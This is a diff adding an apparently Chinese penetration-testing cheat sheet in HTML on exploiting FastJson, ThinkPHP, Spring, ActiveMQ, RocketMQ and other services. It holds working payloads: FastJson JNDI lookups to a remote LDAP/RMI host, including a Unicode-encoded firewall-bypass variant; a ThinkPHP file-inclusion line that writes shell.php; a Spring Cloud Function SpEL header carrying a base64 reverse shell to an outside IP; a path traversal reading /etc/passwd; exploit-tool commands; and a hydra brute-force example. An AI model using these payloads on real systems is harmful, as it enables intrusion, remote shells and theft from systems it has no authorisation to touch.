+        "val": "com.sun.rowset.JdbcRowSetImpl"
+    },
+    "b": {
+        "@type": "com.sun.rowset.JdbcRowSetImpl",
+        "dataSourceName": "ldap://101.32.220.14:1389/cEsHj",
+        "autoCommit": "true"
+    }
+}
+
+# Unicode编码绕过WAF:
+{
+    "a":{
+        "\u0040\u0074\u0079\u0070\u0065":"\u006A\u0061\u0076\u0061\u002E\u006C\u0061\u006E\u0067\u002E\u0043\u006C\u0061\u0073\u0073",
+        "\u0076\u0061\u006C":"\u0063\u006F\u006D\u002E\u0073\u0075\u006E\u002E\u0072\u006F\u0077\u0073\u0065\u0074\u002E\u004A\u0064\u0062\u0063\u0052\u006F\u0077\u0053\u0065\u0074\u0049\u006D\u0070\u006C"
+    },
+    "b":{
+        "\u0040\u0074\u0079\u0070\u0065":"\u0063\u006F\u006D\u002E\u0073\u0075\u006E\u002E\u0072\u006F\u0077\u0073\u0065\u0074\u002E\u004A\u0064\u0062\u0063\u0052\u006F\u0077\u0053\u0065\u0074\u0049\u006D\u0070\u006C",
+        "\u0064\u0061\u0074\u0061\u0053\u006F\u0075\u0072\u0063\u0065\u004E\u0061\u006D\u0065":"\u0072\u006D\u0069\u003A\u002F\u002F\u0031\u0030\u0031\u002E\u0033\u0032\u002E\u0032\u0032\u0030\u002E\u0031\u0034\u003A\u0031\u0030\u0039\u0039\u002F\u007A\u0039\u0069\u0035\u0074\u0074",
+        "\u0061\u0075\u0074\u006F\u0043\u006F\u006D\u006D\u0069\u0074":"\u0074\u0072\u0075\u0065"
+    }
+}</pre>
+        </div>
+        
+        <div class="vulnerability">
+            <h3>#FastJson-WAF加不出网C3P0利用(1247-waf-c3p0)</h3>
+            <ol>
+                <li>插件判断出FastJson及版本特征</li>
+                <li>不出网C3P0链构造利用</li>
+                <li>WAF绕过</li>
+            </ol>
+            <p>添加<code>_</code>或<code>+</code>处理关键字绕过</p>
+            <pre>userOverridesAsString -> us_erOverridesAsString</pre>
+        </div>
+        
+        <div class="vulnerability">
+            <h3>#FastJson-高版本加写入链利用（1268-writefile-jsp）</h3>
+            <ol>
+                <li>插件判断出FastJson及版本特征</li>
+                <li>高版本采用写入链</li>
+            </ol>
+            <p>先探针到中间件及目录，利用链加写入文件内容</p>
+        </div>
+    </div>
+
+    <div class="section">
+        <h2>PHP框架漏洞</h2>
+        
+        <div class="vulnerability">
+            <h3>#PHP-Thinkphp</h3>
+            <p>ThinkPHP是一套开源的、基于PHP的轻量级Web应用开发框架</p>
+            <p>综合工具：武器库-Thinkphp专检（3-6版本）</p>
+            <ol>
+                <li>
+                    <strong>版本6.X文件包含</strong>
+                    <p>在其6.0.13版本及以前</p>
+                    <pre>/?+config-create+/&lang=../../../../../../../../../../../usr/local/lib/php/pearcmd&/&lt;?=phpinfo()?&gt;+shell.php</pre>
+                </li>
+                <li>
+                    <strong>版本5.X命令执行</strong>
+                    <p>其5.0.23以前的版本，5.0.22/5.1.29等</p>
+                </li>
+            </ol>
+        </div>
+        
+        <div class="vulnerability">
+            <h3>#PHP-Laravel</h3>
+            <p>Laravel是一套简洁、优雅的PHP Web开发框架(PHP Web Framework)。</p>
+            <p><strong>CVE-2021-3129 RCE</strong> (Laravel <= 8.4.2)</p>
+            <p>利用工具：<a href="https://github.com/zhzyker/CVE-2021-3129" target="_blank">https://github.com/zhzyker/CVE-2021-3129</a></p>
+            <div class="note">
+                <p>有些也打不动，有Laravel框架使用Goby工具还可能rce。</p>
+            </div>
+        </div>
+    </div>
+
+    <div class="section">
+        <h2>Java框架漏洞</h2>
+        
+        <div class="vulnerability">
+            <h3>#Java-Struts2</h3>
+            <p>Apache Struts2是一个流行的开发Web应用框架，用于开发JavaEE应用。特征就是url后缀是.do和.action</p>
+            <p>一般直接用Struts2漏洞检测工具梭哈了。</p>
+        </div>
+        
+        <div class="vulnerability">
+            <h3>#Java-Spring</h3>
+            <p><strong>Spring-Core-RCE（CVE-2022-22965）</strong></p>
+            <p>存在于Spring框架以及衍生的框架中，并JDK9.0及以上版本会受到影响</p>
+            <p>利用工具：<a href="https://github.com/wjl110/CVE-2022-22965_Spring_Core_RCE" target="_blank">https://github.com/wjl110/CVE-2022-22965_Spring_Core_RCE</a></p>
+            
+            <p><strong>Spring Boot目录遍历（CVE-2021-21234）</strong></p>
+            <p>Spring-boot-actuator-logview 0.2.13之前版本存在路径遍历漏洞，攻击者可通过该缺陷读取系统任意文件。</p>
+            <pre>/manage/log/view?filename=etc/passwd&base=../../../../../../</pre>
+            
+            <p><strong>Spring Cloud Function Spel表达式注入(CVE-2022-22963)</strong></p>
+            <pre>POST /functionRouter
+# 请求头中添加
+spring.cloud.function.routing-expression: T(java.lang.Runtime).getRuntime().exec("bash -c {echo,YmFzaCAtaSA+JiAvZGV2L3RjcC80Ny45NC4yMzYuMTE3LzU1NjYgMD4mMQ==}|{base64,-d}|{bash,-i}")</pre>
+            
+            <p><strong>Spring Cloud Gateway命令执行 (CVE-2022-22947)</strong></p>
+            <p>参考：<a href="https://cloud.tencent.com/developer/article/2164533" target="_blank">https://cloud.tencent.com/developer/article/2164533</a></p>
+            <p>影响版本：</p>
+            <ul>
+                <li>Spring Cloud Gateway 3.1.x < 3.1.1</li>
+                <li>Spring Cloud Gateway 3.0.x < 3.0.7</li>
+                <li>其他旧的、不受支持的Spring Cloud Gateway 版本</li>
+            </ul>
+            
+            <div class="note">
+                <p><strong>监控配置不当利用：</strong>Actuator泄露heapdump。</p>
+            </div>
+        </div>
+    </div>
+
+    <div class="section">
+        <h2>消息队列漏洞</h2>
+        <p><strong>消息队列：</strong>基于异步通信模式的中间件技术，核心功能是在不同的应用程序、服务或组件之间传递消息（数据），起到缓冲、解耦、削峰等作用。</p>
+        <p>常见的消息队列产品包括：Apache Kafka、RabbitMQ、ActiveMQ、RocketMQ等</p>
+        
+        <div class="vulnerability">
+            <h3>#ActiveMQ</h3>
+            <table>
+                <tr>
+                    <th>端口</th>
+                    <th>条件</th>
+                </tr>
+                <tr>
+                    <td>8161 (web)</td>
+                    <td>需配置访问</td>
+                </tr>
+                <tr>
+                    <td>61616 (tcp)</td>
+                    <td>远程访问</td>
+                </tr>
+            </table>
+            <p>开源的消息中间件，它支持Java消息服务、集群、Spring Framework等。</p>
+            <ol>
+                <li>
+                    <strong>CVE-2022-41678</strong>
+                    <p>在5.16.5, 5.17.3版本及以前</p>
+                    <pre>python poc.py -u admin -p admin http://101.32.220.14:8161/</pre>
+                </li>
+                <li>
+                    <strong>CVE-2023-46604</strong>
+                    <p>在5.18.2版本及以前</p>
+                    <pre># 启动HTTP服务
+python3 -m http.server 6666
+
+# 执行利用
+python3 poc.py 目标IP 目标端口 http://IP:6666/poc.xml</pre>
+                </li>
+            </ol>
+        </div>
+        
+        <div class="vulnerability">
+            <h3>#RocketMQ</h3>
+            <table>
+                <tr>
+                    <th>端口号</th>
+                    <th>用途说明</th>
+                </tr>
+                <tr>
+                    <td>9876</td>
+                    <td>NameServer通信端口用于客户端路由请求和Broker注册发现</td>
+                </tr>
+                <tr>
+                    <td>10911</td>
+                    <td>Broker主监听端口处理消息发送/消费等核心服务</td>
+                </tr>
+            </table>
+            <p>Apache RocketMQ是一个分布式消息平台</p>
+            <ol>
+                <li>
+                    <strong>CVE-2023-33246 CVE-2023-37582</strong>
+                    <p>参考：</p>
+                    <ul>
+                        <li><a href="https://mp.weixin.qq.com/s/UsjzX-HSt7QE1QeVBdEXaw" target="_blank">https://mp.weixin.qq.com/s/UsjzX-HSt7QE1QeVBdEXaw</a></li>
+                        <li><a href="https://mp.weixin.qq.com/s/ceZY_TJqsaWyyHubrlKqSw" target="_blank">https://mp.weixin.qq.com/s/ceZY_TJqsaWyyHubrlKqSw</a></li>
+                    </ul>
+                    <p><strong>环境搭建：</strong></p>
+                    <pre>docker pull apache/rocketmq:4.9.1  
+docker pull apacherocketmq/rocketmq-console:2.0.0
+docker run -d -p 9876:9876 -v /data/namesrv/logs:/root/logs -v /data/namesrv/store:/root/store --name rmqnamesrv -e "MAX_POSSIBLE_HEAP=100000000" apache/rocketmq:4.9.1 sh mqnamesrv
+
+# 1.创建broker文件目录  
+mkdir -p /NDTSec/rocketmq/conf/  
+# 2.创建broker.conf文件  
+vim /NDTSec/rocketmq/conf/broker.conf  
+# 3.将下面内容复制粘贴到broker.conf配置文件中：
+brokerClusterName = DefaultCluster   
+brokerName = broker-a   
+brokerId = 0   
+deleteWhen = 04   
+fileReservedTime = 48   
+brokerRole = ASYNC_MASTER   
+flushDiskType = SYNC_FLUSH
+
+# 4.启动broker
+docker run -d -p 10911:10911 -p 10909:10909 -v /data/broker/logs:/root/logs -v /data/broker/store:/root/store -v /NDTSec/rocketmq/conf/broker.conf:/opt/rocketmq/conf/broker.conf --name rmqbroker --link rmqnamesrv:namesrv -e "NAMESRV_ADDR=namesrv:9876" -e "MAX_POSSIBLE_HEAP=200000000" apache/rocketmq:4.9.1 sh mqbroker -c /opt/rocketmq/conf/broker.conf
+
+# 5.启动console
+docker run -d --name rmqconsole -p 8899:8080 --link rmqnamesrv:namesrv -e "JAVA_OPTS=-Drocketmq.namesrv.addr=192.168.88.104:9876 -Dcom.rocketmq.sendMessageWithVIPChannel=false" -t apacherocketmq/rocketmq-console:2.0.0</pre>
+                    <p><strong>利用POC:</strong></p>
+                    <pre># CVE-2023-33246
+https://github.com/vulhub/rocketmq-attack
+https://github.com/Malayke/CVE-2023-33246_RocketMQ_RCE_EXPLOIT
+
+d:\Python3.8\python.exe check.py --ip ip --port 9876
+java -jar rocketmq-attack-1.1-SNAPSHOT.jar AttackBroker --target ip:port --cmd "xxxx"
+
+# CVE-2023-37582
+https://github.com/Malayke/CVE-2023-37582_EXPLOIT
+python.exe CVE-2023-37582.py -ip ip -p 9876</pre>
+                </li>
+            </ol>
+        </div>
+        
+        <div class="vulnerability">
+            <h3>#Kafka</h3>
+            <p>分布式流处理平台，用于高吞吐量实时数据传输存储和处理，广泛应用于日志收集、消息队列、数据管道、实时分析等场景。</p>
+            <p><strong>CVE-2023-25194</strong></p>
+            <p>漏洞影响版本：2.3.0 <= Apache Kafka <= 3.3.2</p>
+            <p>参考：<a href="https://github.com/vulhub/vulhub/blob/master/kafka/CVE-2023-25194/README.zh-cn.md" target="_blank">https://github.com/vulhub/vulhub/blob/master/kafka/CVE-2023-25194/README.zh-cn.md</a></p>
+        </div>
+    </div>
+
+    <div class="section">
+        <h2>未授权访问</h2>
+        <p>项目：<a href="https://github.com/xk11z/unauthorized" target="_blank">https://github.com/xk11z/unauthorized</a></p>
+        <p>参考：<a href="https://mp.weixin.qq.com/s/Qwemde7CmH_WyFKSlcN41Q" target="_blank">https://mp.weixin.qq.com/s/Qwemde7CmH_WyFKSlcN41Q</a></p>
+        
+        <table>
+            <tr>
+                <th>服务</th>
+                <th>端口</th>
+                <th>漏洞类型</th>
+            </tr>
+            <tr>
+                <td>FTP</td>
+                <td>21</td>
+                <td>未授权访问</td>
+            </tr>
+            <tr>
+                <td>LDAP</td>
+                <td>389</td>
+                <td>未授权访问</td>
+            </tr>
+            <tr>
+                <td>Rsync</td>
+                <td>873</td>
+                <td>未授权访问</td>
+            </tr>
+            <tr>
+                <td>ZooKeeper</td>
+                <td>2181</td>
+                <td>未授权访问</td>
+            </tr>
+            <tr>
+                <td>Docker</td>
+                <td>2375</td>
+                <td>未授权访问</td>
+            </tr>
+            <tr>
+                <td>Docker Registry</td>
+                <td>5000</td>
+                <td>未授权访问</td>
+            </tr>
+            <tr>
+                <td>Kibana</td>
+                <td>5601</td>
+                <td>未授权访问</td>
+            </tr>
+            <tr>
+                <td>VNC</td>
+                <td>5900、5901</td>
+                <td>未授权访问</td>
+            </tr>
+            <tr>
+                <td>CouchDB</td>
+                <td>5984</td>
+                <td>未授权访问</td>
+            </tr>
+            <tr>
+                <td>Apache Spark</td>
+                <td>6066、8081、8082</td>
+                <td>未授权访问</td>
+            </tr>
+            <tr>
+                <td>Redis</td>
+                <td>6379</td>
+                <td>未授权访问</td>
+            </tr>
+            <tr>
+                <td>Weblogic</td>
+                <td>7001</td>
+                <td>未授权访问</td>
+            </tr>
+            <tr>
+                <td>Hadoop YARN</td>
+                <td>8088</td>
+                <td>未授权访问</td>
+            </tr>
+            <tr>
+                <td>JBoss</td>
+                <td>8080</td>
+                <td>未授权访问</td>
+            </tr>
+            <tr>
+                <td>Jenkins</td>
+                <td>8080</td>
+                <td>未授权访问</td>
+            </tr>
+            <tr>
+                <td>Kubernetes Api Server</td>
+                <td>8080、10250</td>
+                <td>未授权访问</td>
+            </tr>
+            <tr>
+                <td>Active MQ</td>
+                <td>8161</td>
+                <td>未授权访问</td>
+            </tr>
+            <tr>
+                <td>Jupyter Notebook</td>
+                <td>8888</td>
+                <td>未授权访问</td>
+            </tr>
+            <tr>
+                <td>Elasticsearch</td>
+                <td>9200、9300</td>
+                <td>未授权访问</td>
+            </tr>
+            <tr>
+                <td>Zabbix</td>
+                <td>10051</td>
+                <td>未授权访问</td>
+            </tr>
+            <tr>
+                <td>Memcached</td>
+                <td>11211</td>
+                <td>未授权访问</td>
+            </tr>
+            <tr>
+                <td>RabbitMQ</td>
+                <td>15672、15692、25672</td>
+                <td>未授权访问</td>
+            </tr>
+            <tr>
+                <td>MongoDB</td>
+                <td>27017</td>
+                <td>未授权访问</td>
+            </tr>
+            <tr>
+                <td>NFS</td>
+                <td>2049、20048</td>
+                <td>未授权访问</td>
+            </tr>
+            <tr>
+                <td>Dubbo</td>
+                <td>28096</td>
+                <td>未授权访问</td>
+            </tr>
+            <tr>
+                <td>Druid</td>
+                <td>-</td>
+                <td>未授权访问</td>
+            </tr>
+            <tr>
+                <td>Solr</td>
+                <td>-</td>
+                <td>未授权访问</td>
+            </tr>
+            <tr>
+                <td>SpringBoot Actuator</td>
+                <td>-</td>
+                <td>未授权访问</td>
+            </tr>
+            <tr>
+                <td>SwaggerUI</td>
+                <td>-</td>
+                <td>未授权访问漏洞</td>
+            </tr>
+            <tr>
+                <td>Harbor</td>
+                <td>-</td>
+                <td>未授权添加管理员漏洞</td>
+            </tr>
+            <tr>
+                <td>Windows ipc共享</td>
+                <td>-</td>
+                <td>未授权访问漏洞</td>
+            </tr>
+            <tr>
+                <td>宝塔phpmyadmin</td>
+                <td>-</td>
+                <td>未授权访问</td>
+            </tr>
+            <tr>
+                <td>WordPress</td>
+                <td>-</td>
+                <td>未授权访问漏洞</td>
+            </tr>
+            <tr>
+                <td>Atlassian Crowd</td>
+                <td>-</td>
+                <td>未授权访问</td>
+            </tr>
+            <tr>
+                <td>PHP-FPM Fastcgi</td>
+                <td>-</td>
+                <td>未授权访问漏洞</td>
+            </tr>
+            <tr>
+                <td>uWSGI</td>
+                <td>-</td>
+                <td>未授权访问漏洞</td>
+            </tr>
+            <tr>
+                <td>Kong</td>
+                <td>-</td>
+                <td>未授权访问漏洞</td>
+            </tr>
+            <tr>
+                <td>ThinkAdminV6</td>
+                <td>-</td>
+                <td>未授权访问漏洞</td>
+            </tr>
+        </table>
+    </div>
+
+    <div class="section">
+        <h2>弱口令爆破</h2>
+        <pre># 基本语法
+hydra -l 用户名/-L 用户名文件 -P 密码文件/-p 密码 被攻击者ip 协议
+# 示例：SSH爆破
+hydra -L logins.txt -P pws.txt -M targets.txt ssh</pre>
+    </div>
+
+
+</body>
+
+</html>
